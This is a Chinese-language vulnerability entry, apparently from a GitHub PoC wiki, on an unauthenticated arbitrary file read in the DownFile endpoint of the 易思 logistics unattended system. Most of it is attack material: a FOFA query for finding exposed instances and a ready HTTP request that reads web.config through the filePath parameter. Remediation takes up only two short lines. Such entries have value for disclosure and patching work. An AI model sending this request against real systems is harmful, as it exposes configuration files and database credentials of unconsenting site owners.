---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 易思智能物流无人值守系统 DownFile 任意文件读取漏洞

# 漏洞描述

易思智能物流无人值守系统 DownFile 存在任意文件读取漏洞,未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 影响版本

易思智能物流无人值守系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/api/SingleLogin"

POC/EXP：

GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.0
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

![image-20241112105314959](./.resource/易思智能物流无人值守系统DownFile任意文件读取漏洞/media/image-20241112105314959.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
